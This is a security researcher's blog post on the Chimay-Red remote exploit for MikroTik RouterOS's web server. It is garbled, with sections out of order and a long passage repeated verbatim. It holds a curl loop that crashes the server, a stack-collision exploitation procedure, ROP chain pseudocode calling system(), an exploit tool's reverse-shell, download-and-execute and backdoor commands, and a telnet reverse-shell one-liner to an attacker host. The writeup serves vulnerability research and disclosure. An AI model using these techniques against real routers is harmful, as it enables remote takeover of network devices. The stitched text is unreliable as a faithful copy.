+can automatically use learned information to set up some features with minimal or no configuration.
+MNDP features:
+works on IP level connections
+works on all non-dynamic interfaces
+distributes basic information on the software version
+distributes information on configured features that should interoperate with other MikroTik routers
+The type of information usually associated with MNDP packets are:
+age
+address
+identity
+interface(s)
+mac-address
+platform
+software-id
+unpack version
+uptime,
+hardware info
+To take use of MNDP for detecting the target architecture, its usage is simplified as so:
+Send four null bytes ('\0\0\0\0') to 255.255.255.255:5678.
+Wait a little while.
+Receive information back on 0.0.0.0:5678.
+Detecting version remotely
+Detecting the remote version is simple for majority of the exposed services.
+Here's a few:
+HTTP
+Version string in HTML GET request data from maintenance webpage
+FTP
+Version string in banner
+220 MikroTik FTP server (MikroTik 6.38.4) ready
+TELNET
+Version string in banner
+MikroTik v6.38.4 (stable)
+MNDP
+Version string in version entry within MNDP packet.
+The obvious caveat of using MNDP to retrieve this information, is that the attacker is required to be within the targets subnet.
+Abusing alloca(); a multithreaded tango
+man 3 alloca:
+void *alloca(size_t size)
+...
+The
+alloca() function allocates size bytes of space in the stack frame of the caller.
+If the allocation causes stack overflow, program behavior is undefined.
+The procedure is as follows:
+Two socket connections to the webserver are established, causing www to create two threads to handle the connections. Both threads are expecting HTTP headers and so they are both blocking on a read operation.
+Note: Gray represents the space already taken up on the stack for existing data.
+Thread1 is sent HTTP headers with an HTTP Content-Length string equivalent to 0x29000 (THREAD_STACK_SIZE + len(payload) + SAFE_SPACE). Once headers are received, Thread1's initial read operation finishes. It performs the alloca, subtracting its stack pointer by 0x29000, which places its pointer for *buf at 0x8000 bytes down from the top of Thread2's stack:
+Thread1 is then sent approximately 0x1000 bytes of the 0x29000 it is expecting alligned for istream::read(). This advances the *buf pointer index used by istream::read() up the stack, closer to Thread2's current stack pointer. Thread1 continues waiting as it has not yet received the full amount of data expected (0x29000).
+Thread2, still waiting on its initial network read, is sent HTTP POST headers with a Content-Length string equivalent to approximately the size of the payload (0x8000 as an example), which it uses for its own alloca, subtracting from its stack pointer. Coordinating this length carefully places it precisely where the *buf pointer in Thread1 istream::read() currently points, in the below diagram I have placed it just above so it's visible. Thread2 then calls istream::read() to receive its HTTP Content-Data, causing it to block while waiting to read in data.
+Thread1 is then sent the payload data it is waiting to receive, which is stored starting at its current *buf index in istream::read(), and overwrites where Thread2's stored return address is for istream::read().
+A return from istream::read() can then be triggered by simply closing the connection. Once Thread2 returns, EIP is restored from the overwritten return address value and execution flow is controlled.
+return address overwrite calculation eg:
+ADDR_SIZE = 8
+SAFE_SPACE = 0x1000
+THREAD_STACK_SIZE = 0x20000
+PAYLOAD_LEN = len(payload) # 0x8000
+>>> hex(((THREAD_STACK_SIZE + SAFE_SPACE + PAYLOAD_LEN) - PAYLOAD_LEN) - ((SAFE_SPACE - 0x10) & 0xFFFFFFF0) - ADDR_SIZE)
+'0x20008'
+ROP
+Note: I'll only be explaining the ROP technique for the x86 architecture, as explaining all the techniques would be a blog post in itself. This technique was originally discovered by GitHub user wxsarcher for RouterOS 6.x at BigNerd's version of Chimay-Red. At the time of researching this vulnerability I was not aware of the efforts by BigNerd to also uncover the bug, so big props to BigNerd for being the first (that I can see) to release a working PoC for Chimay-Red! I recommend everyone go and checkout his exploit stuff for Chimay-Red as well, and if you can help him support more architectures, the project is in need of additional architecture research.
+Psuedocode for technique to execute: ls -la
+system_chunks = [134512899, 134513152, 134512899, 134512854, 134514868, 134514240, 134512693]
+#
+("s", "y", "s", "t", "e", "m", "\x00")
+cmd_chunks = [134512885, 134512899, 134512682, 134512891, 134512885, 134516284, 134512693]
+#
+("l", "s", " ", "-", "l", "a", "\x00")
+writable_segment_addr = 134514680
+jmp_eax = 134514248
+char_size = 1
+command = bytes()
+char_pointer = 0
+for address in system_chunks:
+command += rop.call(<strncpy>, args=(<writeable_segment_addr> + char_pointer, address, char_size))
+char_pointer += 1
+system = bytes()
+char_pointer = 0
+for address in cmd_chunks:
+system += rop.call(<strncpy>, args=((<writeable_segment_addr> + (len(system_chunks) + addr_size) + char_pointer, address, char_size))
+char_pointer += 1
+|<<<< rop.call(<dlsym>, args=(0, system))
+|
+|
+Note: [EAX] = resultant pointer of dlsym() call
+|
+|>>>> rop.call(jmp_eax, args=(command,))
+What it do?
+First finds the address of a readable character for each character in the string "system\x00" and our desired command + "\x00" to be run by system().
+Next a writeable_segment_addr in the binary address ranges is searched for to be able to write x amount of characters to via strncpy(), (commonly the bss section is used) where x == len("system\x00"+command+"\x00")
+system_chunks character addresses are then written to the writeable_segment_addr using strncpy(), incrementing the writeable_segment_addr - char_pointer counter value each time a character is written.
+command_chunks character addresses are then written to (writeable_segment_addr + len("system\x00") + addr_size)
+dlsym() in the binary PLT entry table is then called with the target symbol being the original writeable_segment_addr which should be pointing to >
+"system\0"
+The result of the call to dlsym() now should be a pointer to the system() function. This pointer is returned in EAX and jumped to with a jmp eax gadget with its argument register (EBP) set to (writeable_segment_addr + len("system\x00") + addr_size) which should be pointing to > "ls -la\0"
+Produced gadgets:
+Writing "system\0":
+0x0000:
+strncpy strncpy(134594588, 134512899, 1)
+0x0004:
+0x805212e <adjust: pop esi; pop edi; pop ebp; ret>
+0x0008:
+0x805c01c arg0
+0x000c:
+0x8048103 arg1
+0x0010:
+0x1 arg2
+<snip>
+Writing "ls -la\0":
+0x008c:
+strncpy strncpy(134594604, 134512885, 1)
+0x0090:
+0x805212e <adjust: pop esi; pop edi; pop ebp; ret>
+0x0094:
+0x805c02c arg0
+0x0098:
+0x80480f5 arg1
+0x009c:
+0x1 arg2
+<snip>
+Calling dlsym() & jmp_eax():
+0x0118:
+dlsym dlsym(0, 134594588)
+0x011c:
+0x804ffd9 <adjust: pop ebx; pop ebp; ret>
+0x0120:
+0x0 arg0
+0x0124:
+0x805c01c arg1
+0x0128:
+jmp_eax jmp_eax(134594604)
+0x012c:
+b'zaad' <pad>
+0x0130:
+0x805c02c arg0
+Result:
+system("ls -la")
+Once the ROP chain has been built and packed for the given endianess, it can be sent during the payload stage as seen in the earlier procedure when abusing alloca(). Each gadget in the chain should be executed thanks to our return address overwrite earlier.
+MikroDB
+MikroDB is a sister application to Chimay-Red that allows easier portability and extendability of the exploit toolkit. its what allows hundreds of different types of ROP chains to be built without having access to the target binary itself; and it does this through a process like so:
+Enumerates all stable vulnerable RouterOS 6.x versions available for download from MK's archive for all architectures by bruteforcing version numbers via HEAD requests.
+Downloads all enumerated firmware images into a storage directory.
+Catalogs the filename and SHA256 hash of the firmware file into a local SQLite database file.
+Decompresses and extracts the webserver binary www from the SquashFS filesystem stored within NPK firmware image.
+Stores and catalogs the filename and SHA256 hash of the www webserver binary into the SQLite database file.
+For each webserver binary extracted, the file is ran through a ROP chain building process and information for building selected ROP-chain repeatably is stored in the SQLite database file.
+Once MikroDB is finished its process, it can be portably used with Chimay-Red to build ROP-chains on the fly thanks to the stored offsets in the database, instead of downloading and extracting and storing 5GB+ of FW images in-order to facilitate attacking any version and architecture. This 500KB database can be built once in only a couple hours and kept forever. For your convenience, a prebuilt database is included in the source code repository for this project!
+MikroDB was able to enumerate 352 vulnerable versions (as of writing this, it fluctuates oddly..) across all of their supported architectures, a table is represented below showing vulnerable versions available per architecture:
+Architecture
+# Vulnerable versions
+x86
+56
+ARM
+45
+POWERPC
+57
+SMIPS
+56
+MMIPS
+25
+MIPSBE
+57
+TILE
+56
+MikroDB in action against x86: (skip through)
+Wrapping it all together
+Usage:
+usage: chimay_red.py [-h] -t TARGET [-s] [-d] [--architecture ARCHITECTURE]
+[--gdbport GDBPORT] [--binary BINARY]
+[--shellcode SHELLCODE] [--vector VECTOR]
+[--leakrounds LEAKROUNDS] [-v] [--version]
+command
+positional arguments:
+command
+command function to run on target, see below for
+options
+optional arguments:
+-h, --help
+show this help message and exit
+-t TARGET, --target TARGET
+target address:port
+-l LHOST, --lhost LHOST
+local address to bind to for listening for connectback commands
+-s, --shell
+return interactive shell as main payload (default)
+-d, --debug
+enable debugging mode
+--architecture ARCHITECTURE
+target architecture (will detect automatically if
+target in route table range)
+--gdbport GDBPORT
+port to use when connecting to remote gdbserver
+--binary BINARY
+target binary (www)
+--shellcode SHELLCODE
+custom (optional) shellcode payload binary filepath
+--vector VECTOR
+optional vector type, see below for options
+--leakrounds LEAKROUNDS
+amount of rounds to leak pointers, higher is better,
+but takes more time
+-v, --verbose
+Verbosity mode
+--version
+show program's version number and exit
+commands:
+COMMAND
+FUNCTION
+bindshell
+create a bindshell
+connectback
+create a reverse shell
+download_and_exe
+connect back and download a file to then execute
+ssl_download_and_exe
+connect back and download a file via SSL to then execute
+write_devel
+write "devel-login" file to allow developer account login
+write_devel_read_userfile
+in addition to enabling developer logins, read back the users file
+custom_shellcode
+run arbitrary shellcode from `--shellcode` binfile
+custom_shell_command
+run a arbitrary $sh one liner on the target
+vectors:
+default: (mikrodb)
+[Generic]
+mikrodb:
+use the accompanying mikrodb database to load offsets
+based off of detected remote version to build a ROP chain.
+build:
+build a ROP chain from scratch given the www binary matching
+the remote version running.
+[Experimental]
+brute: bruteforce uclibc base offset.
+leak:
+leak pointers from shared libraries to give better odds of
+finding base offset of uclibc.
+examples:
+./chimay_red.py connectback --target 192.168.56.124:80 --lhost=192.168.56.1 --vector=mikrodb
+./chimay_red.py connectback -d --target 192.168.56.124:80 --lhost=192.168.56.1 --vector=build
+--binary $PWD/www --gdbport 4444
+==================================================
+|
+_______
+_
+___
+__|
+| / ___/ /
+(_)_ _
+___ ___ ______/ _ \___ ___/ /|
+|/ /__/ _ \/ /
+' \/ _ `/ // /___/ , _/ -_) _
+/ |
+|\___/_//_/_/_/_/_/\_,_/\_, /
+/_/|_|\__/\_,_/
+|
+|
+/___/
+|
+==================================================
+Additional tips & tricks
+Getting a reverse shell without existing telnet access for devel-login
+mknod /tmp/pipe p;telnet <attacker_ip> <attacker_port></tmp/pipe|bash>/tmp/pipe
+This command creates a READ|WRITE fifo-file pipe in memory using mknod and redirects the standard-in and out of bash to the pipe and out through telnet.
+Sending text to the LCD
+"echo hello world > /dev/lcd"
+image courtesy of BigNerd - Chimay-Red Github
+See it live!
+Chimay-Red in action:
+Chimay-Red in debug mode:
+Conclusions & Future Work
+So did I accomplish my goals in the end? Well almost.
+In the end I was able to exploit every stable release version for all architectures except TILE and ARM. Now you are probably wondering, "what the hell is TILE". It is for that specific reason why I was unable to support TILE. As for ARM, I have not had enough time to go through and test the ROP builder for ARM as of yet, but I hope to fully support the architecture soon.
+I was also unable to complete the command for custom_shellcode as I am not able to get a mprotect ROP-chain working for all architectures and versions.
+As for "Containerize and optionally emulate any system firmware for fuzzing and testing", I will be going over how to containerize and mass deploy swarms of RouterOS systems via Docker and libvirt in a later post so stay tuned :).
+Ideas that didn't work:
+I attempted to leak pointers from the heap by using a content-length of zero and sending small amounts of data into istream::read(). This resulted in some valid addresses being leaked from various areas of the process memory, although I was unable to use it in any way to predict ASLR offsets because of a lack of predictability in the leaked addresses. If the leaked addresses were in fact predictable in terms of their location in the process memory in correlation to the other threads and library load order on some systems it could possibly allow ROP chains to be crafted on the fly without the need of the target source webserver binary version.
+Chimay-Blue?
+Recently MK has fallen victim to an 0day against its Samba service within RouterOS: CVE-2018-7445, allowing for remote code execution. I hope to continue to build upon my existing Chimay-Red framework to integrate it. This should allow me to expand the 6.x exploit set past 6.38.5 and up to 6.41.2.
+Famous MK Forum Quotes:
+"Also, it seems that this exploit may not be functional in RouterOS version above v6.30.1"
+https://forum.mikrotik.com/viewtopic.php?f=21&t=119308&sid=ab6ad0f8565e550e36b99cb29e2e27da&start=50#p619740
+"After a thorough code review, we could not find anything hinting to the described issues."
+https://forum.mikrotik.com/viewtopic.php?f=21&t=119308&sid=ab6ad0f8565e550e36b99cb29e2e27da&start=50#p619740
+In the end, a span of approximately four years elapsed since the vulnerability was introduced until the time it was fixed. Four years should be enough for multiple competent code reviews to catch a blatant integer overflow in a critical function like reading user POST data. The fact this small issue was not discovered and fixed for so long, leads myself and I'm sure others to believe MK doesn't do code reviews or does not complete them often. If you are reading this MK, maybe stop custom writing and maintaining your: Webserver, Samba Server, RADIUS server, SSH server, TELNET server, FTP server, etc. Clearly you can't.
+References
+https://wikileaks.org/ciav7p1/cms/page_16384604.html
+https://wikileaks.org/ciav7p1/cms/page_16384512.html
+https://securelist.com/apt-slingshot/84312/
+Software Used
+Analysis:
+- IDA Pro
+- Binary Ninja
+- BinNavi
+Exploit:
+- pwntools
+- GDB
+- GDB PEDA
+- GEF
+- Binutils Collection
+Download
+Chimay-Red and MikroDB are freely available for download on GitHub:
+https://github.com/seekintoo/chimay-red
+About the Author
+Dayton Pidhirney is a Cybersecurity Researcher at Seekintoo. Dayton is an EE geek and is also Co-Founder of FirePick Services LLC., a maker-grade pick and place machine. Dayton's desk always has wires, screws, components and tools on it. Always. Seriously Dayton, clean your desk...
+Comments, concerns, and corrections are welcome and not triaged by any marketing machine we are aware of: dpidhirney (at) seekintoo (dot) com
+Categories
+arcsight
+careers
+ctf
+research
+Social
+twitter
+linkedin
+github
+© 2018 Seekintoo Ltd. and/or its affiliates.
+All rights reserved. Privacy PolicyChimay-Red
+Seekintoo: blog
+seekintoo.com
+arcsight
+careers
+ctf
+research
+Chimay-Red
+Sat 28 April 2018
+By
+Dayton
+This post outlines and presents the rediscovery, vulnerability analysis and exploitation of a zero-day vulnerability that was
+originally discovered and exploited by the CIA's "Engineering Development Group"; remotely targeting MikroTik's RouterOS
+embedded operating system that was discovered during the "Vault 7" leak via WikiLeaks in March of 2017.
+Brief History and Background
+MikroTik (MK) is a Latvian company founded in 1996 and is known for its routers, switches and wireless network equipment.
+MikroTik is primarily famous for its embedded routing OS/hardware ecosystem: RouterOS and RouterBOARD.
+RouterOS is a uClibC Linux 3.3.5 based embedded OS with a proprietary software based routing suite and tool set written in C++ called "NOVA", and is MK's OS for nearly all of their hardware routing - switching products.
+RouterOS was originally designed for running on the RouterBOARD line of products, but as of the last few years, MK has opened the ability to run RouterOS on any almost any x86 hypervisor, baremetal x86 and more recently a AWS cloud offering.
+What really makes RouterOS and RouterBOARD an attractive option for many is its price point versus the competition with comparable performance and often extra features. A Cisco switch supporting MPLS will run you a few thousand dollars, while the competing MK offering with MPLS is 4x cheaper on average. Although managing an advanced configuration of RouterOS can be a bit of a curve if you are not familiar with systems like Cisco's IOS
+Note: The NOVA suite will not run outside of RouterOS (Eg. docker container) without serious hacks, which I will show in a later post. Having done this has opened up an easier method for exploit fuzzing and testing across many architectures and versions using QEMU or other instrumentable architecture virtualization.
+RouterBOARD 850gx3
+Plausible causes of interest (speculation)
+Why might the CIA be interested in exploiting these devices? Well for starters at any given time, between 1,500,000 and 2,000,000 MK RouterOS devices are exposed on the public net, as seen via shodan.io. These figures are on par with Cisco's exposure numbers and typically three times more exposed than D-Link and other usual suspects.
+Censys additionally reports that around 50,000 RouterOS devices currently have the HTTP management interface exposed to the public net. Top RouterOS device host countries include (in-order): Brazil, China, Indonesia and Russia.
+shodan.io device map: 1 == 1000 devices
+In combination with MK's current deployed scale globally and population in known targeted countries it seems reasonable that MK would be a prime candidate for such exploit development by a nation state. Similarly, found within the leaks is documentation for an exploit kit that compromises the AVTech Network Video Recorder code-named "Mealybug". As of posting this article, AVTech devices are the second most popular shodan search term, with around 130,000 results worldwide; Further re-enforcing the idea that the CIA has interest in developing exploits for very popular consumer hardware.
+Kaspersky also shows claims that tooling to exploit MK has been around "for a long time", as seen in the "Slingshot" APT report FAQ published this year.
+Vault 7
+Vault 7 aka. "Year Zero" was a mega-dump of approximately 23 projects and other various artifacts on Tuesday March 7th, 2017 from the CIA's Engineering Development Group (EDG) division at the Center for Cyber Intelligence (CCI)), a special development branch belonging to the CIA's Directorate for Digital Innovation (DDI) in Langley, Virginia.
+Comprising 8,761 documents and files, the leaks detailed abilities to compromise cars, smart TVs, browsers, phones and operating systems. Most, if not all, leaked projects were developed to preform electronic surveillance and/or cyber-warfare. Although no vulnerability sources or binaries were released, the leaked documentation has given attackers significant direction in rediscovering many of the same exploits.
+The Engineering Development Group is responsible for building certain notable tools as discovered in the leaks, such as: Hive, Cutthroat, Chimay-Red, Dark Matter, and Sonic Screwdriver. These tools were distributed to operators and partners when conducting proxy cyber-activities in regions where the US may face legal issues the partner state does not have as stringent laws against.
+Chimay-Red
+Background
+Chimay-Red is a zero-day exploit for the HTTP management/configuration/proxy webserver called www in MK RouterOS versions 6.x, originally targeting MIPS, MIPSEL, PPC, and x86 architectures. The exploit abuses a multithreaded remote stack collision vulnerability due to an implementation error with the usage of the compiler built-in alloca() by "allocating" a untrusted remotely supplied size value during a content-length header check. It is believed that Chimay-Red was originally used to implant HIVE or TinyShell onto the target system, as noted in the "hive-UsersGuide.pdf" document under: "7.1 (S) Installing Hive on MikroTik MIPS RouterOS 6.x using Chimay-Red".
+Documentation and version release notes suggest that development of the exploit was completed around 07/2015 (pg. 29 hive-UsersGuide.pdf):
+V2.9 (07/01/2015)
+• Adds a user-defined directory path for the .config and .log files to avoid read-only memory.
+• Adds support for MikroTik 6.x.
+Also found within hive-UsersGuide.pdf pg. 23 and image2015-4-27%2010:46:48.png is usage and other interesting information about Chimay-Red's inner workings:
+Exploit Usage:
+Operator usage Python traceback screenshot:
+Notice the hierarchy of the traceback from the Python interpreter. Arguments are passed into the entrypoint, which chooses the exploit module within ChimayRed_v3.7/bin/libs/<arch>/Exploit.py based off of detected or selected architecture and throws the payload in the given module to the given host and port.
+The throw_v6() (exploit version 6.x) function seems to use multiple sockets and predetermined or at least stored content-length and content values to some HTTP POST-able endpoint, which is a interesting hint towards where we might find this bug in the webserver binary.
+Unfortunately, due to the lack of information available within the leaks pertaining the Chimay-Red exploit, I was not unable to recover any more useful background or hints. However, I was confident that I had learned enough to tackle exploiting the vulnerability myself.
+Chimay-Red (my turn)
+Up to the challenge to try and see if I could match what these vulnerability researchers had accomplished in secret and more, I was excited to get started hunting. I had a couple other things going for me as well at the time, some MK MIPS based devices on-hand, the Python traceback screenshot and manuals from the leaks and a patched version of RouterOS released by MK fixing the said vulnerability:
+MK 6.38.5 release notes - link
+Initial Goals
+I didn't just want to replicate the exploit exactly, I wanted to make it even better. So I created a set of requirements for myself of what I think my version of the exploit should accomplish.
+The replica exploit will:
+At minimum, conform to the operators usage guide.
+Support the same architectures and commands.
+Note: Specific supported 6.x versions are unknown via the leaks.
+The replica exploit should:
+Support all 6.x versions and architectures
+Tooling for enumerating, downloading, analyzing and cataloging system firmware
+Needed for building ROP-chains and store metadata for approx ~200 different FW versions
+Containerize and optionally emulate any system firmware for fuzzing and testing.
+On The Hunt
+Extracting FW images:
+Binwalk can help us make quick work of identifying magic bytes within the firmware files in-order to extract the root SquashFS filesystem.
+$ binwalk -e ./routeros-<architecture>-<version>.npk ./routeros-<architecture>-<version>.npk
+4096
+0x1000
+Squashfs filesystem, little endian, version 4.0, compression:xz, size: 7109576 bytes, 1034 inodes, blocksize: 262144 bytes, created: 2016-10-05 12:07:28
+Webserver Binary Location:
+$ find $firmware-images.extracted/squashfs-root -name "www" -type f
+firmware-images.extracted/squashfs-root/nova/bin/www
+$ file $firmware-images.extracted/squashfs-root/nova/bin/www
+www: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
+WWW Reverse Engineering Notes
+Full reverse engineering analysis of the www webserver binary is outside the scope of this post. Although I will provide some important notes:
+One thread per socket connection.
+Each connection is allocated 128KiB (0x20000) of stack space per thread
+This is set by pthread_attr_setstacksize in main()
+Each thread stack space is allocated ontop on the previous thread.
+|
+|
+^-------------^ < Thread2 ESP
+|
+|
+|
+|
+|
+Thread1
+|
+|
+|
+^-------------^ < Thread1 ESP
+|
+|
+|
+|
+|
+Thread0
+|
+|
+|
+^-------------^ < Thread0 ESP
+Automatically restarted on crash after three seconds
+The loader arbiter (/nova/bin/loader) controls this via signal handling and PID tracking.
+ELF Mitigations:
+Architecture
+NX
+CANARY
+PIE
+RELRO
+x86
+YES
+NO
+NO
+NO
+ARM
+YES
+NO
+NO
+NO
+POWERPC
+YES
+NO
+NO
+NO
+SMIPS
+NO
+NO
+NO
+NO
+MMIPS
+NO
+NO
+NO
+NO
+MIPSBE
+NO
+NO
+NO
+NO
+TILE
+NO
+NO
+NO
+NO
+Analyzing the difference with IDA and BinDiff
+By looking at the difference in the assembled sections of the binary of the known vulnerable version and the known fixed version gave a clear look into what exactly has been patched to fix the vulnerability.
+Note: A good BinDiff trick is to look for lowest similarity with high confidence
+6.38.4 versus 6.38.5 BinDiff subroutine similarity chart
+It appears Request::readPostData(int32_t arg1, int32_t arg2) would be a prime candidate to diff due it being the function with the highest confidence rating of a altered subroutine at a score of "0.82".
+Left: 6.38.4 (x86) | Right: 6.38.5 (x86)
+I could not get IDA to produce psuedocode for the subroutine, so instead I have hand written it below (correct me if wrong, please):
+int header;
+int recv_len;
+int *alloca_sp
+int content_length_value = 0;
+char *content_length;
+// Block until request received
+recv_len = sock::recv(32768);
+// Set the name of the header we are looking for
+string::string(&content_length, "content_length");
+// Grab given header_name given the raw request.
+header = Headers::getHeader(&content_length, &content_length_value);
+if (!header) {
+goto exit;
+} else if (recv_len == 0) {
+goto exit;
+} else if (recv_len < content_length_value) {
+goto exit;
+}
+// Stack colision vulnerability due to insufficient content_length_value filtering as seen above.
+// This call is optimized to "sub eax, esp" with most compilers.
+alloca_sp = alloca(content_length_value);
+// Read content_length_value bytes from socket and write
+// into newly likely improperly allocated stack space. (SIGSEGV)
+istream::read(alloca_sp, content_length_value)
+So what's the vulnerability?
+Since no filtering/conditionals are happening to ensure that the content-length_value does not exceed the thread stack page size limits, the vulnerability could be triggered by passing a negative number into the content-length header. This results in a alloca() *size argument far exceeding the size of the current connection thread stack frame size of 128KiB during a logical AND of the size value to enforce stack alignment.
+alloca() in-lined assembly snippet from readPostData():
+8055a56:
+8d 42 10
+lea
+eax,[edx+0x10] << load effectively content_length_value from edx+0x10 into eax
+8055a59:
+83 e0 f0
+and
+eax,0xfffffff0 << AND content_length_value to enforce stack alignment at mutliples of 16 bytes
+8055a5c:
+29 c4
+sub
+esp,eax
+<< "allocate" space by subtracting the stack pointer (esp) by content_legth_value
+Example alloca() alignment in Python:
+>>> content_length_value = -1
+>>> (content_length_value - 0x10) & 0xFFFFFFF0
+4294967264
+As you can see in the example alignment calculation, due to the logical AND preformed on the content_length_value to enforce the stacksize to be in alignment with STACK_ALIGN (16 bytes on most architectures), an integer overflow has occurred. This will cause alloca() to attempt to subtract the stack pointer by a massive amount, exhausting additional thread stack space causing the webserver to SIGSEGV when that unallocated memory is improperly accessed during the next threaded connection or by other arbitrary access.
+The patched version ensures no such overlaps can occur by first validating the content_length_value and resizing before reaching alloca().
+Identifying a POST method URL endpoint on the webserver:
+To discover a URL endpoint on the webserver that I could actually POST arbitrary data into, I fired up WireShark and browsed to the login page of the management server and logged in. This shows a POST endpoint available in the working directory called /jsproxy:
+PoC ()
+At this point we should have a proof of concept that we can use to test if the target webserver crashes. Simply passing a negative one into the content_length header should be enough
+to wrap the integer and overallocate to crash the server. To test, we can craft this header with CURL in a POST request and spam the webserver with it in a loop :).
+CURL PoC:
+while ; do curl -X POST -H "Content-Length: -1" -d '{"foo":"bar"}' http://<target>:80/jsproxy && sleep 0.5; done
+ASCIInema PoC demo:
+As you can see, the webserver crashes and is automatically restarted every three seconds.
+Building the Exploit
+For a test target, I just installed RouterOS within VirtualBox and bound the first interface to a host-only adapter. I won't be covering this in particular, in-depth instructions can be found on Google.
+Most of the tools I used in this section and recommend others to use for embedded Linux exploit development/research:
+pwntools
+MIPSROP
+GDB
+GDB PEDA
+GEF
+Binutils Collection
+Getting a debugger on the target
+I'm going to need a debugger on my target in-order to further understand and analyze the crash before going any further.
+This is a fairly simple and straightforward process thanks to MK enabling something called devel-login, which will allow us to gain a root shell.
+Mount both partitions from RouterOS Virtual Disk
+$ mount /dev/sda1 /mnt/disk1
+$ mount /dev/sda2 /mnt/disk2
+Create a file called devel-login in /dev/disk2/etc/
+$ touch /dev/disk2/etc/devel-login
+Copy uClibC compiled gdbserver to /mnt/disk1/flash/bin
+$ cp ./gdbserver /mnt/disk/flash/bin
+Connect over telnet to target and login as devel-login, blank password:
+MikroTik 6.38.4 (stable)
+MikroTik Login: devel-login
+Password:
+BusyBox v1.00 (2017.03.02-08:29+0000) Built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+#
+Run the gdbserver previously copied into /flash/bin/gdbserver.i686:
+$ /flash/bin/gdbserver 0.0.0.0:4444 --attach $(pidof www)
+You can now do remote debugging with GDB:
+$ gdb -q
+gdb-peda$ target remote 192.168.56.124:4444
+Exploit Building Preconditions and Requirements
+To avoid NX (non-executable) memory protections and ASLR (Address-Space-Layout-Randomization) on (x86, ARM, POWERPC), typical return-oriented techniques can be employed to reuse existing executable memory once execution flow via the IP (Instruction Pointer) is controlled. Therefore on systems without NX applied (MIPS* and TILE); NX does not need to be bypassed and has the ability to execute code on the stack. For my purposes I will be using a ROP (Return-Oriented-Programming) chain every time for every architecture regardless.
+Why? Because why not? ROP chains work on both systems with and without NX protections, can't hurt ¯_(ツ)_/¯.
+But what this still means is the attacker (me) must have the target version of webserver (www) present to gather instruction offsets for ROP. This is where MikroDB comes in as you will see shortly in the post.
+Detecting architecture remotely
+Architecture is discovered remotely via a protocol called MNDP (MikroTik Neighbor Discovery Protocol).
+MNDP
+The MikroTik Neighbor Discovery Protocol (MNDP) eases network configuration and management
+by enabling each MikroTik router to discover other connected MikroTik routers and learn
+information about the system along with features which are enabled. The MikroTik routers
+can automatically use learned information to set up some features with minimal or no configuration.
+MNDP features:
+works on IP level connections
+works on all non-dynamic interfaces
+distributes basic information on the software version
+distributes information on configured features that should interoperate with other MikroTik routers
+The type of information usually associated with MNDP packets are:
+age
+address
+identity
+interface(s)
+mac-address
+platform
+software-id
+unpack version
+uptime,
+hardware info
+To take use of MNDP for detecting the target architecture, its usage is simplified as so:
+Send four null bytes ('\0\0\0\0') to 255.255.255.255:5678.
+Wait a little while.
+Receive information back on 0.0.0.0:5678.
+Detecting version remotely
+Detecting the remote version is simple for majority of the exposed services.
+Here's a few:
+HTTP
+Version string in HTML GET request data from maintenance webpage
+FTP
+Version string in banner
+220 MikroTik FTP server (MikroTik 6.38.4) ready
+TELNET
+Version string in banner
+MikroTik v6.38.4 (stable)
+MNDP
+Version string in version entry within MNDP packet.
+The obvious caveat of using MNDP to retrieve this information, is that the attacker is required to be within the targets subnet.
+Abusing alloca(); a multithreaded tango
+man 3 alloca:
+void *alloca(size_t size)
+...
+The
+alloca() function allocates size bytes of space in the stack frame of the caller.
+If the allocation causes stack overflow, program behavior is undefined.
+The procedure is as follows:
+Two socket connections to the webserver are established, causing www to create two threads to handle the connections. Both threads are expecting HTTP headers and so they are both blocking on a read operation.
+Note: Gray represents the space already taken up on the stack for existing data.
+Thread1 is sent HTTP headers with an HTTP Content-Length string equivalent to 0x29000 (THREAD_STACK_SIZE + len(payload) + SAFE_SPACE). Once headers are received, Thread1's initial read operation finishes. It performs the alloca, subtracting its stack pointer by 0x29000, which places its pointer for *buf at 0x8000 bytes down from the top of Thread2's stack:
+Thread1 is then sent approximately 0x1000 bytes of the 0x29000 it is expecting alligned for istream::read(). This advances the *buf pointer index used by istream::read() up the stack, closer to Thread2's current stack pointer. Thread1 continues waiting as it has not yet received the full amount of data expected (0x29000).
+Thread2, still waiting on its initial network read, is sent HTTP POST headers with a Content-Length string equivalent to approximately the size of the payload (0x8000 as an example), which it uses for its own alloca, subtracting from its stack pointer. Coordinating this length carefully places it precisely where the *buf pointer in Thread1 istream::read() currently points, in the below diagram I have placed it just above so it's visible. Thread2 then calls istream::read() to receive its HTTP Content-Data, causing it to block while waiting to read in data.
+Thread1 is then sent the payload data it is waiting to receive, which is stored starting at its current *buf index in istream::read(), and overwrites where Thread2's stored return address is for istream::read().
+A return from istream::read() can then be triggered by simply closing the connection. Once Thread2 returns, EIP is restored from the overwritten return address value and execution flow is controlled.
+return address overwrite calculation eg:
+ADDR_SIZE = 8
+SAFE_SPACE = 0x1000
+THREAD_STACK_SIZE = 0x20000
+PAYLOAD_LEN = len(payload) # 0x8000
+>>> hex(((THREAD_STACK_SIZE + SAFE_SPACE + PAYLOAD_LEN) - PAYLOAD_LEN) - ((SAFE_SPACE - 0x10) & 0xFFFFFFF0) - ADDR_SIZE)
+'0x20008'
+ROP
+Note: I'll only be explaining the ROP technique for the x86 architecture, as explaining all the techniques would be a blog post in itself. This technique was originally discovered by GitHub user wxsarcher for RouterOS 6.x at BigNerd's version of Chimay-Red. At the time of researching this vulnerability I was not aware of the efforts by BigNerd to also uncover the bug, so big props to BigNerd for being the first (that I can see) to release a working PoC for Chimay-Red! I recommend everyone go and checkout his exploit stuff for Chimay-Red as well, and if you can help him support more architectures, the project is in need of additional architecture research.
+Psuedocode for technique to execute: ls -la
+system_chunks = [134512899, 134513152, 134512899, 134512854, 134514868, 134514240, 134512693]
+#
+("s", "y", "s", "t", "e", "m", "\x00")
+cmd_chunks = [134512885, 134512899, 134512682, 134512891, 134512885, 134516284, 134512693]
+#
+("l", "s", " ", "-", "l", "a", "\x00")
+writable_segment_addr = 134514680
+jmp_eax = 134514248
+char_size = 1
+command = bytes()
+char_pointer = 0
+for address in system_chunks:
+command += rop.call(<strncpy>, args=(<writeable_segment_addr> + char_pointer, address, char_size))
+char_pointer += 1
+system = bytes()
+char_pointer = 0
+for address in cmd_chunks:
+system += rop.call(<strncpy>, args=((<writeable_segment_addr> + (len(system_chunks) + addr_size) + char_pointer, address, char_size))
+char_pointer += 1
+|<<<< rop.call(<dlsym>, args=(0, system))
+|
+|
+Note: [EAX] = resultant pointer of dlsym() call
+|
+|>>>> rop.call(jmp_eax, args=(command,))
+What it do?
